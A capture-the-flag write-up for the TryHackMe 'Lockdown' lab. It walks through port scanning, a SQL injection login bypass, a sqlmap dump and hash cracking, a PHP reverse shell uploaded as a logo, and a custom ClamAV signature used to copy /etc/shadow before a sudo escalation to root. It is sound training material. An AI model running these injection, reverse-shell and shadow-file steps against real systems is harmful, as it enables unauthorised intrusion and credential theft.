# Try Hack Me - Lockdown

**Categories:**  Security, Linux  
**Difficulty:**  Medium

Commands used in this guide use the exported variable $IP (`export IP=10.10.115.135`) in place of the target machine's IP address.

## 1: Enumeration - nmap

Having launched the machine, we perform a basic TCP port scan with nmap (`sudo nmap $IP -p-`) followed by a version enumeration scan on the 2 discovered ports (22 and 80) :

```console
┌──(kali㉿kali)-[~/Documents/tthm/lockdown]
└─$ sudo nmap -sV -p22,80 $IP
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-02 10:58 EDT
Nmap scan report for 10.10.115.135
Host is up (0.099s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.06 seconds
```

Google / searchsploit shows no relevant vulnerabilities for these versions.

Navigating to the application on 80 in the browser triggers a redirect to `contacttracer.thm` - we add the entry to `/etc/hosts/` and repeat the request, revealing a pair of login pages `/login.php` and `/admin/login.php`. Trying basic credential pairs doesn't work ('admin:admin', 'admin:password', etc.), so we start a gobuster scan using dirbuster's medium wordlist to provide more information on the structure of the application : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/lockdown]
└─$ gobuster dir -u $IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
...snip...
/uploads              (Status: 301) [Size: 316] [--> http://10.10.115.135/uploads/]
/admin                (Status: 301) [Size: 314] [--> http://10.10.115.135/admin/]
/plugins              (Status: 301) [Size: 316] [--> http://10.10.115.135/plugins/]
/classes              (Status: 301) [Size: 316] [--> http://10.10.115.135/classes/]
/temp                 (Status: 301) [Size: 313] [--> http://10.10.115.135/temp/]
/dist                 (Status: 301) [Size: 313] [--> http://10.10.115.135/dist/]
/inc                  (Status: 301) [Size: 312] [--> http://10.10.115.135/inc/]
```

The majority of these directories are empty or unavailable, but checking the source of the `/admin/login.php` page reveals a script `/dist/js/script.js` that appears to provide a file upload function with no client-side file restrictions : 

```js
// System Info
        $('#system-frm').submit(function(e){
                e.preventDefault()
                start_loader()
                if($('.err_msg').length > 0)
                        $('.err_msg').remove()
                $.ajax({
                        url:_base_url_+'classes/SystemSettings.php?f=update_settings',
                        data: new FormData($(this)[0]),
                        ...snip...
```

Google searching the `SystemSettings.php?f=update_settings` endpoint returns [exploit-db results](https://www.exploit-db.com/exploits/49604) that appear to confirm a file upload vulnerability in the application (normally we would have used these scripts but I was unable to get shells uploaded using them to connect back, even with authentication).

## Admin panel - sqli

Returning to the admin panel at `/admin/login.php`, we monitor the failed login requests and notice that the failure response includes the query made by the server in processing the request :

```console
┌──(kali㉿kali)-[~/Documents/tthm/lockdown]
└─$ curl -X POST -d 'password=aaaa&username=aaaa' $IP/classes/Login.php?f=login
{"status":"incorrect","last_qry":"SELECT * from users where username = 'aaaa' and password = md5('aaaa') "}
```

So obviously this looks injectable - we repeat the request with an injection attempt on username :

```console
┌──(kali㉿kali)-[~/Documents/tthm/lockdown]
└─$ curl -X POST -d "password=aaaa&username=' OR 1=1-- -'" $IP/classes/Login.php?f=login
{"status":"success"}
```

and we are connected as admin. From here, we have two options - we can use sqlmap to attempt to dump the application database, and we can revisit the file upload vulnerability with an authenticated account. Let's start with the db dump.

## 3. DB dump and credential discovery - sqlmap

To help sqlmap along, we first capture a failed login request with burp, save the request as `req.txt` and pass it to sqlmap using the `-r` flag : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/lockdown]
└─$ sqlmap -r req.txt --batch --dbs
...snip... (lots of ...snip...)
[12:09:50] [INFO] retrieved: cts_db
available databases [2]:
[*] cts_db
[*] information_schema
```

The login request response has already told us that the fields "username" and "password" exist in the table "users", so we can dump these fields directly from the discovered `cts_db` database (we'll come back later if we need anything else) :

```console
┌──(kali㉿kali)-[~/Documents/tthm/lockdown]
└─$ sqlmap -r req.txt --batch --dump -D cts_db -T users -C username,password
...snip... (again, a whole lot of ...snip...)
[12:18:10] [WARNING] no clear password(s) found
Database: cts_db
Table: users
[1 entry]
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | 3eba6f73c19818c36ba8fea761a3ce6d |
+----------+----------------------------------
```

This isn't the trickiest hash format to identify, but the response to the failed login has already told us that this is an md5 hash. We save the hash to a file `hash` for cracking with john and the rockyou wordlist :

```console
┌──(kali㉿kali)-[~/Documents/tthm/lockdown]
└─john hash --format=Raw-MD5 --wordlist=rockyou
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
PASSWORD (?)
1g 0:00:00:00 DONE (2021-10-02 12:23) 5.263g/s 6556Kp/s 6556Kc/s 6556KC/s sweety65..sweetloveibou
```

Sure enough, the discovered password provides access to the admin panel : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/lockdown]
└─$ curl -X POST -d 'password=PASSWORD&username=admin' $IP/classes/Login.php?f=login
{"status":"success"}
```

## 4. File upload vulnerability - php reverse shell

The exploit scripts found in section 1 all focus on replacing images used in the application. Navigating to the admin dashboard, a link to `/admin/?page=system_info` provides a form that allows the user to upload a new logo using the previously discovered `system-frm` function. Following the same approach, we upload a [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/8aa37ebe03d896b432c4b4469028e2bed75785f1/php-reverse-shell.php) as a logo image, start a netcat listener, and navigate to the `login.php` page that displays the logo :

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lnvp 123211
listening on [any] 12321 ...
connect to [ATTACK-IP] from (UNKNOWN) [10.10.115.135] 39310
...snip...
sh-4.4$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Catting `/etc/passwd` reveals two non-system users cyrus and maxine. Attempting to switch to the cyrus user requires a tty shell upgrade (`python3 -c 'import pty; pty.spawn("/bin/bash")`) but is ultimately successful with the password discovered in the db :

```console
www-data@lockdown:/$ su cyrus
su cyrus
Password:
cyrus@lockdown:/$ id
uid=1001(cyrus) gid=1001(cyrus) groups=1001(cyrus)
```

The user flag is at `/home/cyrus/user.txt`. From here, you can also add a key to `/home/cyrus/.ssh/authorized_keys` to improve the snazziness of your shell.

## 5. Privesc, cyrus -> maxine - clamscan rules

Running `sudo -l` as the cyrus user shows that they can run the script `/opt/scan/scan.sh` as root :

```console
cyrus@lockdown:~$ sudo -l
Matching Defaults entries for cyrus on lockdown:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cyrus may run the following commands on lockdown:
    (root) /opt/scan/scan.sh
```

Investigating the script (which is not writeable by cyrus), we find that it calls [clamav antivirus scanner](http://www.clamav.net/) and "quarantines" (copies) files identified by the scan in `/home/cyrus/quarantine` : 

```console
cyrus@lockdown:~$ ls -l /opt/scan/scan.sh && cat $_
-rwxr-xr-x 1 root root 255 May 11 04:28 /opt/scan/scan.sh
#!/bin/bash

read -p "Enter path: " TARGET

if [[ -e "$TARGET" && -r "$TARGET" ]]
  then
    /usr/bin/clamscan "$TARGET" --copy=/home/cyrus/quarantine
    /bin/chown -R cyrus:cyrus /home/cyrus/quarantine
  else
    echo "Invalid or inaccessible path."
fi
```

It is worth considering the steps taken by the script in detail :

1. Reads user input for a file / directory path and assigns the input to the $TARGET variable (`read -p ... TARGET`)
2. Checks that the provided path exists (`-e`) and is readable by the current user (`-r`) : given that we can run the script as root, readability should not be a problem
3. Calls `/usr/bin/clamscan` to scan the given path, copying any files identified by the scan to `/home/cyrus/quarantine` - the "$..." expansion oof the user provided TARGET variable prevents command injection, and the full path to the clamscan binary prevents a PATH hijack
4. Changes the owner of the copied files to cyrus (`chown -R cyrus:cyrus`)- again, the full path used to call chown prevents a PATH hijack

The key finding here is that the script has root read and copy access to all files on the system, and will make any files "discovered" by clamscan available to the cyrus user -  if we can find a way to force clamscan to "discover" arbitrary files, we will have full read access to the system. So how does clamscan discover files? Like most AVs, it compares files to known signatures. [Stackoverflow tells us that clamab stores these known signatures](https://askubuntu.com/questions/114000/how-to-update-clamav-definitions-database) at `/var/lib/clamav`, where we find the rule used to discover the `testvirus` file stored in cyrus' home directory : 

```console
cyrus@lockdown:/var/lib/clamav$ ls
main.hdb  mirrors.dat
cyrus@lockdown:/var/lib/clamav$ cat main.hdb 
69630e4574ec6798239b091cda43dca0:69:EICAR_MD5
```

We can confirm that the `/var/lib/clamav` directory is writeable by cyrus, but how do we go about writing our rules? [The clamav docs provide a guide to writing our own signature rules](https://docs.clamav.net/manual/Signatures/ExtendedSignatures.html). The signatures follow a base format "MalwareName:TargetType:Offset:HexSignature", where HexSignature is the signature (in bytes) that clamscan searches for in scanned files. So now we're in a position to attempt an attack, and with full read access to the system, we're going to target `/etc/shadow`. Skimming the clamav docs for info on the TargetType and Offset parameters allows us to write the following rule, hex encoding "root:" to match the first shadow entry followed by any number of bytes (??). The `.ndb` file extension is provided by the docs : 

```console
cyrus@lockdown:/var/lib/clamav$ echo "exploit:0:*:726f6f743a??" >> exploit-rule.ndb
```

We then run the script providing `/etc/shadow` as the scan target :

```console
Enter path: /etc/shadow
/etc/shadow: exploit.UNOFFICIAL FOUND
/etc/shadow: copied to '/home/cyrus/quarantine/shadow'

----------- SCAN SUMMARY -----------
Known viruses: 3
Engine version: 0.103.2
Scanned directories: 0
Scanned files: 1
Infected files: 1
Data scanned: 0.00 MB
Data read: 0.00 MB (ratio 0.00:1)
Time: 0.006 sec (0 m 0 s)
Start Date: 2021:10:02 17:17:19
End Date:   2021:10:02 17:17:19
```

and sure enough, a copy of `/etc/shadow` is available at `/home/cyrus/quarantine` with the maxine user's password hash : 

```console
cyrus@lockdown:~$ tail quarantine/shadow
...snip...
maxine:$6$/syu6s6/$Z5j6C61vrwzvXmFsvMRzwNYHO71NSQgm/z4cWQpDxMt3JEpT9FvnWm4Nuy.xE3xCQHzY3q9Q4lxXLJyR1mt320:18838:0:99999:7:::
cyrus:$6$YWzR.V19JxyENT/D$KuSzWbb6V0iXfIcA/88Buum92Fr5lBu6r.kMoQYAdfvbJuHjO7i7wodoahlZAYfFhIuymOaEWxGlo0WkhbqaI1:18757:0:99999:7:::
...snip...
```
Once again, we copy the discovered hash to a file `hash_max` and attempt to crack with john and rockyou :

```console
┌──(kali㉿kali)-[~/Documents/tthm/lockdown]
└─john -wordlist=rockyou hash_max
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
PASSWORD           (?)
1g 0:00:00:24 DONE (2021-10-02 13:23) 0.04151g/s 3358p/s 3358c/s 3358C/s vivita..skyline123
```

## 6. Privesc, maxine -> root - sudoers ALL

Switching to maxine with the discovered password, we again run `sudo -l` :

```console
Matching Defaults entries for maxine on lockdown:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User maxine may run the following commands on lockdown:
    (ALL : ALL) ALL
```

and we use the ALL permissions to open a shell as root : 

```console
maxine@lockdown:/home/cyrus$ sudo -u root bash -p
root@lockdown:/home/cyrus# id
uid=0(root) gid=0(root) groups=0(root)
```

The root flag is at `/root/root.txt`.
